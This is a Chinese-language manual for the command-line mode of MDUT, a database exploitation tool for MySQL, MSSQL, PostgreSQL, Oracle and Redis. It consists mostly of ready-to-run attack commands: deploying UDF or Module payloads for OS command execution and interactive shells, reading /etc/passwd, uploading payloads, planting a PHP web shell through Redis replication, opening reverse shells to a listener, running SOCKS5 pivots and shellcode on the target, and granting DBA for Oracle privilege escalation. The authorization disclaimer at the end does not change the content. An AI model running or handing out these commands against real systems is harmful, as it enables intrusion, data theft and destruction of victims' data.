# MDUT CLI 使用手册

MDUT CLI 是主程序内置的无图形界面模式，语法参考 sqlmap。GUI 与 CLI 共用连接、SQL 和利用引擎，不需要另外下载插件或运行时。

```bash
mdut cli [连接参数] [动作] [修饰参数]
```

> 文中的 `mdut` 代表主程序可执行文件。Windows 下使用实际的 `.exe` 文件名。

## 1. 快速开始

```bash
# 查看中英文帮助
mdut cli --help
mdut cli --lang zh --help

# 测试 MySQL 连接并打印版本
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --check

# 执行 SQL（不会部署利用载荷）
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" -q "SELECT user(), version()"

# 自动部署 UDF、执行命令、退出时清理本次部署
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --exec "id"

# 交互式命令 Shell
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --shell
```

## 2. 基本规则

- 一次调用使用一个连接、一个会话和一个主动作；多步操作可写成 shell 脚本。
- `--deploy` 可以与另一个动作连用；`--blind`、`--pg-method` 是修饰参数，不是主动作。
- SQL 查询、元数据操作和 Redis 原生命令不会部署利用载荷。
- 利用动作会先探测环境；已有且满足动作要求的载荷会被复用，不会重复部署。
- 默认只自动清理**当前进程成功创建并确认归属的载荷**。复用别人或旧进程部署的载荷不会被清理。
- 退出码：
  - `0`：成功
  - `1`：参数、动作、能力、执行或清理失败
  - `2`：连接或 Ping 失败

## 3. 连接参数

### 3.1 DSN 连接

| 数据库 | DSN 示例 |
|---|---|
| MySQL | `mysql://root:secret@127.0.0.1:3306/mysql?tls=true` |
| MSSQL | `mssql://sa:secret@127.0.0.1:1433/master` |
| PostgreSQL | `postgres://postgres:secret@127.0.0.1:5432/postgres?sslmode=disable` |
| Oracle | `oracle://test:secret@127.0.0.1:1521/XEPDB1` |
| Redis | `redis://:secret@127.0.0.1:6379/2` 或无密码 `redis://127.0.0.1:6379` |

说明：

- 未写端口时使用默认端口：MySQL 3306、MSSQL 1433、PostgreSQL 5432、Oracle 1521、Redis 6379。
- `postgresql://` 是 `postgres://` 的别名。
- Oracle 的路径段是 **service name**，不是 SID。`--service-name` 或 DSN 的 `?service_name=` 可覆盖它。
- Redis 路径段是 DB 编号，写入连接器的 `extra.db`；负数、非数字和越界值会报错。
- 当前 Redis 连接器不支持 ACL username；`redis://user:pass@...` 会明确报错，不会静默忽略。
- 未识别的 DSN query 参数会报错，不会被静默丢弃。

### 3.2 离散参数

不想处理 DSN 编码时，可全部使用离散参数：

```bash
mdut cli \
  --type mysql --host 127.0.0.1 --port 3306 \
  --user root --pass 'p@ss/w:rd' --db mysql --check
```

离散参数也可与 `-d` 混用，非空离散值覆盖 DSN 同名字段：

```bash
mdut cli -d "mysql://root@127.0.0.1:3306/mysql" --pass 'p@ss/w:rd' --check
```

密码有三种传法：

1. DSN 中使用 URL 编码，例如 `p@ss/w:rd` 写成 `p%40ss%2Fw%3Ard`
2. `--pass 'p@ss/w:rd'`，原样传递，无需编码
3. `MDUT_PASS='p@ss/w:rd'`，避免密码出现在进程列表中

### 3.3 数据库专用 extra

`--extra key=value` 可重复，等价于 DSN query 参数：

| 数据库 | 支持的值 | 示例 |
|---|---|---|
| MySQL | `tls` | `--extra tls=true` |
| PostgreSQL | `sslmode` | `--extra sslmode=disable` |
| Oracle | `service_name`、`as_sysdba` | `--extra as_sysdba=true` |
| Redis | `db` | `--extra db=2` |

### 3.4 连接代理

```bash
mdut cli -d "mysql://root:secret@10.0.0.8:3306/mysql" \
  --proxy "socks5://user:pass@127.0.0.1:1080" --check
```

`--proxy` 是**访问数据库时使用的出口代理**，与利用动作 `--socks5` 在目标上启动的正向代理不是一回事。

### 3.5 复用 GUI 保存的连接

```bash
# 查看保存的连接（不会连接数据库）
mdut cli --list-conns
mdut cli --list-conns --json

# 复用完整配置，包括代理和 Redis rogue 配置
mdut cli --conn-id SAVED_CONNECTION_ID --check
```

- `--conn-id` 与 `-d`、`--type`、`--host`、`--port`、`--user`、`--db` 互斥。
- 显式 `--pass` 可覆盖保存的密码；`MDUT_PASS` **不会**覆盖保存的密码。
- `--proxy`、`--service-name`、`--rogue`、`--relay`、`--module-path` 可显式覆盖保存值。
- `--list-conns --json` 不输出密码和代理配置。

## 4. 输出、语言和超时

| 参数 | 作用 |
|---|---|
| `--json` | 使用结构化 JSON 输出，适合脚本处理 |
| `--lang zh` / `--lang en` | 指定 help 和 CLI 自身错误语言 |
| `--charset <name>` | 指定目标命令/文件字符集，例如 `GBK` |
| `--timeout <seconds>` | 单次引擎调用超时，默认 30 秒；不改变 15 秒连接超时 |

语言优先级：`--lang` > `LANG`/`LC_ALL` 中的 `zh*` > 英文。

`--check --json` 输出形如：

```json
{"type":"mysql","version":"5.7.44"}
```

`--read-file` 默认把远端内容原样写到 stdout，可直接重定向：

```bash
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --read-file /etc/passwd > passwd.txt
```

`--socks5` 和 Oracle `--revshell` 的常驻等待不受 `--timeout` 限制；REPL 内每条命令分别应用该超时。

## 5. SQL 与元数据动作（免部署）

| 动作 | 用途 | 示例 |
|---|---|---|
| `--check` | 连接、Ping、打印版本 | `--check` |
| `-q, --query <sql>` | 查询并打印全部结果集 | `-q "SELECT * FROM user"` |
| `-e, --execute <sql>` | 执行 DDL/DML，打印影响行数 | `-e "CREATE TABLE t(id INT)"` |
| `--dbs` | 列出数据库/模式 | `--dbs` |
| `--tables <db>` | 列出表 | `--tables mysql` |
| `--columns <db.table>` | 列出字段 | `--columns mysql.user` |
| `--ddl <db.table>` | 打印建表 DDL，失败时降级为字段摘要 | `--ddl mysql.user` |
| `--redis-cmd <text>` | Redis 原生命令，每行一条 | `--redis-cmd $'SET a 1\nGET a'` |

`--columns` 和 `--ddl` 在第一个点分隔数据库与表名。

Redis 示例：

```bash
mdut cli -d "redis://127.0.0.1:6379/2" --redis-cmd $'SELECT 2\nSET foo "bar baz"\nGET foo'
```

每行独立执行，支持单双引号；未闭合引号会回退为空格拆分。空行被忽略，输出顺序与输入一致。

## 6. 利用环境、部署与清理

### 6.1 环境检查

```bash
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --env-check
```

只执行探测，不部署。输出版本、目标 OS/架构、权限、插件目录和当前能力。

### 6.2 部署与自动清理

```bash
# 独立部署并保留（仅 MySQL、PostgreSQL UDF、Redis 支持）
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --deploy

# 后续显式清理可恢复的部署
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --cleanup

# 部署 + 执行 + 默认清理本次部署
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --deploy --exec "id"

# 保留本次部署
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --exec "id" --no-cleanup
```

规则：

- 已有可复用载荷时不重复部署，也不会把复用载荷当作当前进程所有。
- 只有当前进程明确成功创建的载荷才会自动清理。
- Oracle 和 MSSQL 不支持独立 `--deploy`；请直接使用具体动作。
- `--cleanup` 不会为了清理而先部署。
- 部署失败或被 SIGINT 中断时，CLI 不会冒险执行可能误删其他会话载荷的通用清理；会重新探测并报告可能残留，需要人工检查。

### 6.3 跨进程清理边界

| 数据库 | 跨进程 `--cleanup` 行为 |
|---|---|
| MySQL | 探测到可恢复 UDF 后清理，包括函数和可删除的载荷文件 |
| PostgreSQL | 探测到可恢复 UDF 后清理；libc 另有独立 `CleanupLibc` |
| Redis | 仅在检测到已加载 Module 时卸载；未加载时报告无需清理 |
| Oracle | 仅支持可恢复的 Java 策略，包括旧版固定名 `MDUT_SHELL`；当前随机名部署不保证可恢复 |
| MSSQL | 不支持独立跨进程清理，不会先部署再伪装清理成功 |

## 7. 命令执行

### 7.1 回显与静默模式

```bash
# 等待并打印输出
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --exec "id && uname -a"

# 静默执行：不等待输出，适合长驻进程、起服务、写文件
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --blind --exec "sleep 60"

# 中文 Windows 输出
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --charset GBK --exec "dir"
```

`--blind` 是 `--exec` 和 `--shell` 的修饰参数。MSSQL Agent Job、Oracle Scheduler 等策略本身只能盲执行时，会显示无回显警告。

执行结果中的错误也会使命令以退出码 `1` 结束；如果动作失败但已经部署了载荷，仍会尝试清理本次部署。

### 7.2 交互 Shell

```bash
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --shell
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --shell --blind
```

- 输入 `exit`、`quit` 或 Ctrl+D 退出。
- 空闲等待输入和执行命令期间均可响应 SIGINT/SIGTERM，并进入正常清理流程。
- 可管道使用：

```bash
printf 'id\nwhoami\nexit\n' | mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --shell
```

## 8. 文件操作

所有路径都通过独立参数传递，不使用冒号拼接，因此完整支持 `C:\...`。

| 动作 | 用法 |
|---|---|
| 列目录 | `--list-dir /tmp` |
| 读文件到 stdout | `--read-file /etc/passwd` |
| 下载 | `--download --src /remote/file --dst /local/file` |
| 上传 | `--upload --src /local/file --dst /remote/file` |
| Redis 精确写 | `--write-precise --src /local/file --dst /remote/file` |
| 删除 | `--delete-file /tmp/a.txt` |
| 新建目录 | `--mkdir /tmp/a` |
| 重命名 | `--rename --src /tmp/a.txt --dst /tmp/b.txt` |
| 新建空文件 | `--touch /tmp/empty.txt` |
| 文件大小 | `--file-size /tmp/a.txt` |
| SHA256 | `--hash-file /tmp/a.txt` |

上传与下载使用 512 KiB 原始字节分块：

- 上传首块 `WriteFile`，后续 `AppendFile`，每块检查远端写入计数。
- 下载先取远端大小，按解码后的字节偏移读取。
- 支持 0 字节文件。
- MSSQL 只有 `ChunkedIO` 可用时才允许分块上传/下载；普通文件浏览不强制要求 CLR。
- Oracle 的 `--mkdir` 使用 Java 策略递归创建缺失的父目录；目标目录已存在时幂等成功，路径被普通文件占用或创建失败时明确报错。Scheduler 策略会明确报告不支持；不支持 `--hash-file` 的策略也会明确报错。

示例：

```bash
# 上传并校验
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" \
  --upload --src ./payload.bin --dst /tmp/payload.bin
mdut cli -d "mysql://root:secret@127.0.0.1:3306/mysql" --hash-file /tmp/payload.bin
shasum -a 256 ./payload.bin

# Windows 路径
mdut cli -d "mssql://sa:secret@192.168.1.10:1433/master" \
  --download --src 'C:\Windows\Temp\a.txt' --dst ./a.txt
```

## 9. 反弹 Shell、SOCKS5 和 Shellcode

### 9.1 反弹 Shell

本地先监听：

```bash
nc -lv 443
```

执行：

```bash
mdut cli -d "mysql://root:secret@192.168.1.10:3306/mysql" --revshell 192.168.1.20:443
```

- 地址使用 `host:port`；IPv6 使用 `[::1]:443`。
- Oracle 的反弹 Shell 需要保持 Java 调用和数据库会话：CLI 启动后会持续等待，直到用户按 SIGINT/SIGTERM。不要在 shell 尚未使用完时杀掉 CLI。
- 其他数据库发起后立即返回。

### 9.2 目标端 SOCKS5

```bash
mdut cli -d "mysql://root:secret@192.168.1.10:3306/mysql" \
  --socks5 0.0.0.0:1080 --socks5-auth 'user:pass'
```

这里的 `0.0.0.0:1080` 是**目标服务器**监听地址，不是本机地址。启动成功后从另一终端使用：

```bash
curl -x socks5h://192.168.1.10:1080 http://example.com

- 进程持续运行，Ctrl+C 后按顺序停止 SOCKS5、清理本次载荷、断开连接。
- 认证密码可以包含冒号，只在第一个冒号处分隔用户名和密码。
- 独立 `--stop-socks5` 只在能明确恢复运行状态时使用；Oracle 新进程不支持，不能把空状态当成停止成功。

### 9.3 Shellcode

```bash
mdut cli -d "mssql://sa:secret@192.168.1.10:1433/master" --shellcode @calc.hex
```

- 输入是十六进制文本；`@file` 表示从文件读取 hex，不是直接读取二进制文件。
- 仅 Windows 目标，且受当前策略能力限制；Oracle 不支持。

## 10. 各数据库专用行为

### 10.1 Oracle

```bash
# 权限报告与提权路径
mdut cli -d "oracle://test:secret@127.0.0.1:1521/XEPDB1" --priv-report

# 默认 GRANT DBA
mdut cli -d "oracle://test:secret@127.0.0.1:1521/XEPDB1" --privesc

# 以高权限执行自定义 SQL
mdut cli -d "oracle://test:secret@127.0.0.1:1521/XEPDB1" \
  --privesc --privesc-sql "GRANT CREATE EXTERNAL JOB TO test"
```

- `--priv-report`、`--privesc` 不部署载荷。
- 只有默认 GRANT DBA 成功且此前不是 DBA 时才提示重新连接生效；自定义 SQL、失败或已是 DBA 不提示。
- Java Source 支持回显和文件管理；Scheduler 主要用于盲执行。
- 旧版固定名 Java 恢复后不能假定 SOCKS5 可用，需先 `--cleanup` 再按提示重新部署。
- Oracle 的 `--revshell` 是常驻动作，等待期间不会被 `--timeout` 中断。

### 10.2 MSSQL（仅 Windows 目标）

- 执行策略按 xp_cmdshell → OLE → Agent Job 降级，Agent Job 只有盲执行。
- Windows 可附加 CLR 扩展，提供反弹 Shell、Shellcode 和 SOCKS5。
- 文件管理与分块 I/O 不依赖 CLR；无 CLR 时仍可按内置策略能力上传、下载和浏览目录，以实际能力报告为准。
- 部署前记录 xp_cmdshell/OLE 原配置，清理时恢复原值，不会把管理员原本开启的配置直接关闭。
- MSSQL Linux 不在 CLI 支持范围。

### 10.3 PostgreSQL

```bash
# COPY TO PROGRAM（PG 9.3+，无需 UDF）
mdut cli -d "postgres://postgres:secret@127.0.0.1:5432/postgres" \
  --pg-method copy_program --exec "id"

# libc system()（仅 PG < 8.2）
mdut cli -d "postgres://postgres:secret@127.0.0.1:5432/postgres" \
  --pg-method libc --exec "id"
```

- 默认 `--pg-method udf`；每个新进程都需要重新指定其他方式。
- `copy_program` 和 `libc` 的命令执行不部署 UDF。
- 文件操作、反弹 Shell、SOCKS5、Shellcode 仍按 UDF 能力处理。
- libc 使用独立清理逻辑，仅删除本次创建的随机函数，不清理复用 UDF。

### 10.4 Redis

#### 直接回连部署

```bash
mdut cli -d "redis://127.0.0.1:6379" \
  --rogue host.docker.internal:21000 --exec "id"
```

`--rogue HOST:PORT` 要求非零固定端口：CLI 在本机绑定同一端口，并把该地址通告给目标。`HOST` 必须是目标可达地址，Docker 场景常用 `host.docker.internal`。

#### Relay 模式

```bash
mdut cli -d "redis://10.0.0.8:6379" \
  --relay VPS_IP:21000 --rogue VPS_IP:21001 --exec "id"
```

`--relay` 是控制口地址；`--rogue` 是目标可见的 VPS 主从回连地址，两者都必填。`--module-path` 只影响 Module 落地路径，不是精确写目标路径。

#### 精确文件写入

```bash
mdut cli -d "redis://127.0.0.1:6379" \
  --rogue host.docker.internal:21000 \
  --write-precise --src ./shell.php --dst /var/www/html/shell.php
```

- 目录探测（`DirProbe`）可用时，`--list-dir` 直接列目录，不为此部署 Module；Lua 沙箱逃逸通道可用时，`--revshell` 也不为此部署 Module。其他文件操作及 SOCKS5 仍要求 Module。

- 直接走主从复制，不部署或清理 Module。
- **会清空目标内存数据集并覆盖同名文件**。
- 小于 9 字节的输入会补换行到 9 字节；二进制内容只有达到该长度才保持逐字节一致。
- Redis 8 默认禁用 Module 命令，且 `dir`/`dbfilename` 可能为 protected config，Module 和复制写链会受限制。
- Redis 的 `--revshell` 仅支持非 Windows 目标；Shellcode 仅 Windows 目标。

## 11. 脚本化示例

```bash
#!/usr/bin/env bash
set -euo pipefail

export MDUT_PASS='p@ss/w:rd'
DSN="mysql://root@127.0.0.1:3306/mysql"

# 连接检查
mdut cli -d "$DSN" --check --json

# 查询
mdut cli -d "$DSN" -q "SELECT user(), version()" --json

# 执行命令并上传文件
mdut cli -d "$DSN" --exec "id"
mdut cli -d "$DSN" --upload --src ./report.txt --dst /tmp/report.txt

# 静默启动长任务
mdut cli -d "$DSN" --blind --exec "nohup /tmp/worker >/tmp/worker.log 2>&1 &"
```

## 12. 常见问题

| 问题 | 处理方式 |
|---|---|
| 密码含 `@`、`:`、`/`、`#`、`%` | 使用 `--pass` 或 `MDUT_PASS`；DSN 中必须 URL 编码 |
| Oracle 报连接服务错误 | 检查 path/`--db` 是 service name，不要按 SID 理解 |
| Redis 总是写到 DB0 | 使用 `redis://host:6379/N` 或 `--extra db=N` |
| 提示需要 rogue | 提供目标可达的 `--rogue HOST:PORT`；relay 还需 `--relay` |
| 命令没有输出 | 当前策略可能只支持盲执行；检查能力摘要，不要盲目等待 |
| 部署后仍有残留 | 失败/中断的部署不保证自动回滚；按提示检查目标并清理 |
| `--no-cleanup` 后想清理 | 用 `--cleanup`，但仅限引擎可恢复状态 |
| SOCKS5 或 Oracle revshell 一直不退出 | 这是正常常驻行为，用 SIGINT/SIGTERM 结束，不套 `--timeout` |
| 出现 unknown architecture | 目标 INFO 缺少可识别机器架构，CLI 会拒绝猜测载荷平台 |

## 安全说明

CLI 会在目标上执行 SQL、写入文件、注册函数或加载模块。精确写会清空 Redis 内存数据集。仅在授权环境使用，并优先让默认自动清理完成；失败或中断时按输出提示检查目标残留。
